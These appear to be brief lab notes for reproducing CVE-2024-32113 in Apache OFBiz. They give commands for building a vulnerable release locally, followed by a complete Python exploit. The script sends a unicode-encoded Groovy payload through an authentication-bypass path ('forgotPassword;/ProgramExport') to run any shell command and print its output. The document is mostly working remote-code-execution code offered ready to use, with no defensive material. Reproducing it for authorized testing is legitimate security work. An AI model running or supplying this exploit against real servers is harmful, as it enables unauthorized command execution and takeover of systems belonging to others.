CVE-2024-32113

jdk 8

git clone https://github.com/apache/ofbiz-framework.git
cd ofbiz-framework
git checkout release17.12

./gradlew loadAll
./gradlew ofbiz

https://github.com/Mr-xn/CVE-2024-32113

```
import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) != 3:
    print("python3 exploit.py <ip> <cmd>")

ip = sys.argv[1]
cmd = sys.argv[2]

url = f"https://{ip}:8443/webtools/control/forgotPassword;/ProgramExport"

proxies = {"http":"127.0.0.1:8080",
           "https":"127.0.0.1:8080"
           }

headers = {
    "Host": "127.0.0.1:8443",
    "Content-Type": "application/x-www-form-urlencoded"
}
exploit = f"throw new Exception('{cmd}'.execute().text);"
encoded = "".join(f"\\u{ord(c):04x}" for c in exploit)
data = f"groovyProgram={encoded}"

response = requests.post(
    url,
    headers=headers,
    data=data,
    # proxies=proxies,
    verify=False  # equivalent to curl -k
)

print("Status:", response.status_code)

html = response.text

match = re.search(
    r"java\.lang\.Exception:\s*(.*?)</p>",
    html,
    re.DOTALL | re.IGNORECASE
)

if match:
    exception_text = match.group(1).strip()
    print(exception_text)
else:
    print("No exception found")
```

